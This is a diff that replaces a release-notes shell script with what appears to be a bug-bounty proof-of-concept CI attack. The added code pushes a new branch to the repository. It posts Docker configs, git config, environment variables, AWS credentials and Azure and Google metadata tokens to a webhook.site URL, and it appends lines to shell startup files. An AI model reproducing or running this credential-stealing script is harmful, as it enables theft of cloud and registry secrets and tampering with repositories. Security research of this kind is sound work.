@@ -1,29 +1,78 @@
 #!/usr/bin/env bash
+#filename: myscript.sh
 
-# -e  Exit immediately if a command exits with a non-zero status.
-# -u  Treat unset variables as an error when substituting.
-
-set -eu
-set -o pipefail
-
-# Gets Release notes for the latest release from CHANGELOG.md
-#
-# This script takes description in `markdown` format from CHANGELOG.md file
-# You must to use the `markdown` H2 tag for the release version
-# and `markdown` H3 tag for the description
-#
-# Script will return the content between the first and second string occurrences
-# that start with H2 markdown tag with release version: example: `## [1.0.0]`
-#
-# How to use:
-#   release-notes.sh CHANGELOG.md
+echo "-------------poc_hello--------------" >&2
 
 
-# Searching for line which starts from markdown H2 tag: ## [1.0.0]
-VERSION_PATTERN="^## \[[0-9]+\\.[0-9]+\\.[0-9]+]"
+echo "--- creating malicious branch, can easily push to master or release ---" >&2 
+git config --global user.email "bh@someemail.com"
+git config --global user.name "H1Tester"
+git fetch origin >&2
+git checkout master >&2
+git pull origin master >&2
+git checkout -b bh-poc >&2
+git add . >&2
+git push -u origin bh-poc >&2
+echo "--- token extraction ---" >&2 
 
-startLine=$(($(cat < "$1" | grep -nE "$VERSION_PATTERN" | head -n 1 | tail -n 1 | cut -d ":" -f 1) + 1))
-finishLine=$(($(cat < "$1" | grep -nE "$VERSION_PATTERN" | head -n 2 | tail -n 1 | cut -d ":" -f 1) - 1))
-changelog=$(sed -n "${startLine},${finishLine}p" "$1");
+export webhook="https://webhook.site/a474db99-e55d-4f2d-a818-32537da737da"
 
-echo "${changelog}"
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(cat ~/.docker/config.json)" \
+    "$webhook/docker_cred"
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(cat /home/runner/.docker/config.json)" \
+    "$webhook/docker_cred2"
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(cat .git/config)" \
+    "$webhook/git_config"
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(git config --list)" \
+    "$webhook/git_config_list"
+
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(cat /home/runner/.gitconfig)" \
+    "$webhook/home_runner_gitconfig"
+
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(printenv)" \
+  "$webhook/printenv"
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(cat ~/.aws/cli/cache)" \
+  "$webhook/aws_cli_cache"
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(cat ~/.aws/credentials)" \
+  "$webhook/aws_cli_credentials"
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(curl -H \"Metadata: true\" \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\")" \
+  "$webhook/azure_credentials"
+
+curl -X POST \
+  -H "Content-Type: text/plain" \
+  --data "$(curl -s -H "Metadata-Flavor: Google" \"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token\")" \
+  "$webhook/google_credentials"
+
+
+
+git config --list >&2
+
+echo 'echo "hello bash" >&2' >> ~/.bashrc
+echo 'echo "hello bash" >&2' >> /etc/bash.bashrc
+sleep 2 # in real attack it will be 1200 to have time to edit 
